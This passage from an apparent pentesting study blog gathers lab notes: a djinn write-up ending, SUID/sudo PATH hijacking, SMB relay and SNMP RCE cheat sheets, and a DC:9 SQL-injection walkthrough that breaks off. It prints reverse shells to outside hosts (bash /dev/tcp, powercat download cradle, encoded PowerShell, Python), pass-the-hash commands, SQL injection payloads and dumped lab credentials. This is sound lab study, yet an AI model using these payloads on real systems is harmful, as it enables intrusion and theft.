class="hljs-built_in">print</span> <span class="hljs-string">&#x27;2 - Guess the number&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;3 - Read some damn files&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;4 - Work&#x27;</span><br>    choice = int(input(<span class="hljs-string">&#x27;Enter your choice: &#x27;</span>))<br>    <span class="hljs-built_in">return</span> choice<br><br>def main(op):<br>    <span class="hljs-keyword">if</span> op == 1:<br>        naughtyboi()<br>    <span class="hljs-keyword">elif</span> op == 2:<br>        guessit()<br>    <span class="hljs-keyword">elif</span> op == 3:<br>        readfiles()<br>    <span class="hljs-keyword">elif</span> op == 4:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;work your ass off!!&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Do something better with your life&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(options())<br><span class="hljs-comment"># okay decompiling Untitled.pyc</span><br></code></pre></td></tr></table></figure><p>though other’s walkthrough,it seems the python2’s exploit in func<code>input</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1bfea061eed9a5bc62602.png"><br>let’s get root<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/80db1e469430f61f46d6d.png"></p><h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a href="https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/">walkthrouth by Raj Chandel</a>(python2 exploit PE)<br><a href="https://lifesfun101.github.io/2019/12/07/Djinn-walkthrough.html#privilege-escalation-rooute-1">walkthrough another one</a>(there was another PE way!)<br><a href="https://www.vulnhub.com/entry/djinn-1,397/">download djinn</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUID,SUDO binary hijack</title>
    <link href="/SUID,SUDO-binary-hijack/"/>
    <url>/SUID,SUDO-binary-hijack/</url>
    
    <content type="html"><![CDATA[<h1 id="find-the-suid-file"><a href="#find-the-suid-file" class="headerlink" title="find the suid file"></a>find the suid file</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>if it was in the list of GTFObins<br><em><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></em><br>so excute command follow GTFObins,if it not in the list.<br>use follow ways</p><h1 id="Sudo-command-SUID-binary-without-command-path"><a href="#Sudo-command-SUID-binary-without-command-path" class="headerlink" title="Sudo command/SUID binary without command path"></a>Sudo command/SUID binary without command path</h1><p><strong>sudo:</strong><br>If the <strong>sudo permission</strong> is given to a single command <em>without specifying the path</em>: <strong>hacker10 ALL= (root) less</strong> you can exploit it by changing the PATH variable</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br><span class="hljs-comment">#Put your backdoor in /tmp and name it &quot;less&quot;</span><br>sudo less<br></code></pre></td></tr></table></figure><p><strong>suid:</strong><br>using strings to check the suid file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings reset_pass <br>···<br><span class="hljs-built_in">echo</span> john:john | chpasswd<br>···<br></code></pre></td></tr></table></figure><p>in this binary file, it dont specify the command path,so we could inject the path</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=$(<span class="hljs-built_in">pwd</span>):<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>check the PATH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/john:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin<br></code></pre></td></tr></table></figure><p>and move the bound reverse-shell into this path(/home/john) and name it chpasswd(remember add x to the file)<br>bound reverse-shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.166.195/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>and excute the suid binary file.<br>or we could add a suid bash file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;#!/bin/bash\ncp /bin/bash /dev/shm/bash\nchmod 4775 /dev/shm/bash&#x27;</span>&gt; chpasswd<br><span class="hljs-built_in">chmod</span> 777 chpasswd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dev/shm/bash -p<br></code></pre></td></tr></table></figure><p>if i meet new situation, i will update the article.</p><h1 id="recommend-blog-or-material"><a href="#recommend-blog-or-material" class="headerlink" title="recommend blog or material"></a>recommend blog or material</h1><p><a href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e">Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Medium</a></p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path">Linux Privilege Escalation | HackTricks | HackTricks</a></p><p><a href="https://juggernaut-sec.com/suid-sgid-part-2-lpe/#Exploiting_SUID_Binaries_%E2%80%93_Shared_Object_Injection">SUID | SGID Part-2 – Linux Privilege Escalation</a></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>penetrate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SMB,SMTP,SNMP enum</title>
    <link href="/SMB-SMTP-SNMP-enum/"/>
    <url>/SMB-SMTP-SNMP-enum/</url>
    
    <content type="html"><![CDATA[<h1 id="SMB-attack"><a href="#SMB-attack" class="headerlink" title="SMB attack"></a>SMB attack</h1><p>tools of manage smb and enum:<br><em>enum4linux</em><br><em>CrackMapExec</em><br><em>smbclient</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //ip<br></code></pre></td></tr></table></figure><p>login by hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b<br><span class="hljs-built_in">dir</span><br>get secrets.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> set user</li><li><code>--pw-nt-hash</code> use passwd hash </li></ul><p>login by passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient  \\\\172.16.205.11\\<span class="hljs-built_in">test</span> -U joe --password=Flowers1<br></code></pre></td></tr></table></figure><p>tools of command excute:<br><em>impacket-wmiexec</em><br><em>impacket-psexec</em><br>use hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">impacket-psexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 administrator@192.168.214.121<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec -hashes 00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.216.70<br></code></pre></td></tr></table></figure><ul><li><code>-hashs</code> use “LMHash:NTHash”,if there was no LM,use 32bit 0</li><li>second parameter: “username@ip”</li></ul><p>use passwd to get a shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbexec MEDTECH/joe:Flowers1@172.16.205.11<br></code></pre></td></tr></table></figure><p><em>impacket-ntlmrelayx</em><br>smb-relay passwd-hash(u cant crack)<em>no UAC</em><br>this module could relay a command to the target use the hash of passwd,if they have the same hash</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">users:<br>machine:FILE01 FILE02<br>users <span class="hljs-keyword">in</span> FILE01:<br>sam administrator file02admin<br>users <span class="hljs-keyword">in</span> FILE02:<br>dave administrator file02admin<br><br>so <span class="hljs-keyword">if</span> we have <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation message <span class="hljs-keyword">of</span> file02admin,we could use <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> authencation <span class="hljs-keyword">of</span> FILE02 <span class="hljs-keyword">and</span> excute <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span><br><span class="hljs-keyword">the</span> authencation about smb (Net-NTLMv2)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c <span class="hljs-string">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span><br></code></pre></td></tr></table></figure><p>powershell reverse shell one-liner</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> IEX (New-Object System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://192.168.45.210/powercat.ps1&#x27;</span>);<span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.45.210</span> -p <span class="hljs-number">4444</span> -e cmd<br></code></pre></td></tr></table></figure><p><a href="https://www.base64encode.org/">https://www.base64encode.org/</a> encode the liner by utf-16le charset</p><p>reverse shell just powershell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.205.121&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br><br>cmd = <span class="hljs-string">&quot;powershell -nop -w hidden -e &quot;</span> + base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf16&#x27;</span>)[<span class="hljs-number">2</span>:]).decode()<br><br><span class="hljs-built_in">print</span>(cmd)<br></code></pre></td></tr></table></figure><ul><li><code>--no-http-server</code> ban http server cause we use smb relay</li><li><code>-t</code> set the target</li><li><code>-smb2support</code> add the support to smb2</li><li><code>-c</code> set the command<br>in the FILE01 machine<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">45.210</span>\test<br></code></pre></td></tr></table></figure></li></ul><p>check the dir of smb</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#powershell</span><br><span class="hljs-built_in">ls</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br>cmd<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br></code></pre></td></tr></table></figure><p><em>net view</em>(Windows)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net view \\name /all<br></code></pre></td></tr></table></figure><p><em>nbtscan</em></p><h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>skip!!!</p><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p><a href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-snmp">snmp hacktricks</a><br>SNMP MIB tree</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1.3.6.1.2.1.25.1.6.0</td><td>System Processes</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.2</td><td>Running Programs</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.4</td><td>Processes Path</td></tr><tr><td>1.3.6.1.2.1.25.2.3.1.4</td><td>Storage Units</td></tr><tr><td>1.3.6.1.2.1.25.6.3.1.2</td><td>Software Name</td></tr><tr><td>1.3.6.1.4.1.77.1.2.25</td><td>User Accounts</td></tr><tr><td>1.3.6.1.2.1.6.13.1.3</td><td>TCP Local Ports</td></tr></tbody></table><p>public common string</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span><br><span class="hljs-keyword">private</span><br>manager<br></code></pre></td></tr></table></figure><p>scan a range:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> public &gt; community<br><span class="hljs-built_in">echo</span> private &gt;&gt; community<br><span class="hljs-built_in">echo</span> manager &gt;&gt; community<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> 192.168.50.<span class="hljs-variable">$ip</span>; <span class="hljs-keyword">done</span> &gt; ips<br>onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure><p>tools:<br><em>snmpwalk</em>:<br>enume the hole tree</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -Oa -v1 -t 10 192.168.214.149<br></code></pre></td></tr></table></figure><ul><li><code>-c</code> set community string</li><li><code>-Oa</code> This parameter will automatically translate any hexadecimal string into ASCII that was otherwise not decoded.</li><li><code>-v1</code> specify the SNMP version number</li><li><code>-t</code> set the timeout period<br>enum the users(set OID 1.3.6.1.4.1.77.1.2.25 in the table)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.4.1.77.1.2.25<br></code></pre></td></tr></table></figure>enum the process<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.4.2.1.2<br></code></pre></td></tr></table></figure>enum the software installed <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.6.3.1.2<br></code></pre></td></tr></table></figure>enum the listening tcp port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.6.13.1.3<br></code></pre></td></tr></table></figure>enum<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v 2c -c public 192.168.240.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull<br></code></pre></td></tr></table></figure><h2 id="brute"><a href="#brute" class="headerlink" title="brute"></a>brute</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf&gt; use auxiliary/scanner/snmp/snmp_login<br>nmap -sU --script snmp-brute 192.168.214.149 --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <br>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.214.149<br>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.214.149 snmp<br></code></pre></td></tr></table></figure></li></ul><h2 id="RCE-in-snmp"><a href="#RCE-in-snmp" class="headerlink" title="RCE in snmp"></a>RCE in snmp</h2><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">SNMP RCE hacktricks</a><br>if u enum the <em>run-on-read()</em>,it could rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>test:<br>inject the command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 192.168.214.149 \<br><span class="hljs-string">&#x27;nsExtendStatus.&quot;evilcommand&quot;&#x27;</span> = createAndGo \<br><span class="hljs-string">&#x27;nsExtendCommand.&quot;evilcommand&quot;&#x27;</span> = /bin/echo \<br><span class="hljs-string">&#x27;nsExtendArgs.&quot;evilcommand&quot;&#x27;</span> = <span class="hljs-string">&#x27;hello world&#x27;</span><br></code></pre></td></tr></table></figure><p>excute it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>inject the revserse shell<br><code>https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 <span class="hljs-string">&#x27;nsExtendStatus.&quot;command10&quot;&#x27;</span> = createAndGo <span class="hljs-string">&#x27;nsExtendCommand.&quot;command10&quot;&#x27;</span> = /usr/bin/python3.6 <span class="hljs-string">&#x27;nsExtendArgs.&quot;command10&quot;&#x27;</span> = <span class="hljs-string">&#x27;-c &quot;import sys,socket,os,pty;s=socket.socket();s.connect((\&quot;10.10.14.84\&quot;,8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\&quot;/bin/sh\&quot;)&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>listen the port and excute it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>or exploit<br><code>https://github.com/mxrch/snmp-shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install snmp snmp-mibs-downloader rlwrap -y<br>git <span class="hljs-built_in">clone</span> https://github.com/mxrch/snmp-shell<br><span class="hljs-built_in">cd</span> snmp-shell<br>sudo python3 -m pip install -r requirements.txt<br></code></pre></td></tr></table></figure><p>usage:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rlwrap python3 shell.py 192.168.214.149 -c public<br></code></pre></td></tr></table></figure><p>if u need excute long command like u ssh publickey,u need to run the <em>legacy.py</em><br><em>use a <code>ed25519</code> SSH publickey, not a <code>RSA</code> one, it’s shorter.</em></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DC:9</title>
    <link href="/vulnhub-wp-DC-9/"/>
    <url>/vulnhub-wp-DC-9/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                           <br>16 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 960                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.1.1     28:c8:7c:19:bf:e8     10     600  zte corporation                                                                                                       <br>192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                       <br>192.168.1.6     0c:d8:6c:a5:e7:a1      1      60  SHENZHEN FAST TECHNOLOGIES CO.,LTD                                                                                    <br>192.168.1.10    08:00:27:2a:5c:99      1      60  PCS Systemtechnik GmbH                                                                                                <br>192.168.1.4     c4:e1:a1:cf:47:95      1      60  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD                                                                    <br>192.168.1.3     a2:86:90:e6:04:98      1      60  Unknown vendor                                                                                                        <br>192.168.1.2     ca:71:62:08:70:8a      1      60  Unknown vendor                                                                                                        <br></code></pre></td></tr></table></figure><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -oN nmap_scan 192.168.1.10 -sV -sC --min-rate 5000 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 15:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.10 (192.168.1.10)<br>Host is up (0.00012s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Example.com - Staff Details - Welcome<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 08:00:27:2A:5C:99 (Oracle VirtualBox virtual NIC)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.95 seconds<br></code></pre></td></tr></table></figure><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>在web页面存在sql注入，可以通过联合查询<br>select database:<code>-1&#39; union select 1,2,3,4,5,database()##</code>, database：Staff<br>select tables:<code>-1&#39; union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=database()##</code>, tables：StaffDetails，Users<br>select columns_name in users <code>-1&#39; union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_name=&#39;Users&#39;##</code>, columns in Users:UserID,Username,Password<br>select username and password:<code>-1&#39; union select 1,2,3,4,group_concat(Username),group_concat(Password) from Users##</code><br>credentials:<code>admin:856f5de590ef37314e7c3bdf6f8a66dc</code>, we could crack it in <a href="https://crackstation.net/">https://crackstation.net/</a>.<br><code>admin:transorbital1</code><br>我们通过手工查询到了web登录的信息，然后可以继续手工测试或者用sqlmap直接一把梭，首先查询所有数据库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql --dbms=mysql --batch --dbs<br>···<br>[19:35:32] [INFO] fetching database names<br>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] <span class="hljs-built_in">users</span><br>···<br></code></pre></td></tr></table></figure><ul><li><code>--batch</code> 所有选项都选yes</li><li><code>--dbs</code> 爆出所有库。<br>既然我们已经得到了Staff库里的信息，那我们爆一下users库里的东西<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql --dbms=mysql --batch -D <span class="hljs-built_in">users</span> --dump<br>···<br>Database: <span class="hljs-built_in">users</span><br>Table: UserDetails<br>[17 entries]<br>+----+------------+---------------+---------------------+-----------+-----------+<br>| <span class="hljs-built_in">id</span> | lastname   | password      | reg_date            | username  | firstname |<br>+----+------------+---------------+---------------------+-----------+-----------+<br>| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |<br>| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |<br>| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |<br>| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |<br>| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |<br>| 6  | Mouse      | B8m<span class="hljs-comment">#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br>| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |<br>| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |<br>| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |<br>| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |<br>| 11 | Green      | yN72<span class="hljs-comment">#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br>| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |<br>| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |<br>| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |<br>| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |<br>| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |<br>| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |<br>+----+------------+---------------+---------------------+-----------+-----------+<br>···<br></code></pre></td></tr></table></figure></li><li><code>-D</code> 指定数据库</li><li><code>--dump</code> 获取字段中的数据，其实就是爆表<br>我们可以把这些用户名和密码都存起来，后面需要密码喷洒的时候会用。接着我们去web页面登录admin看看，我们登录后，在每个页面都能发现一个”File does not 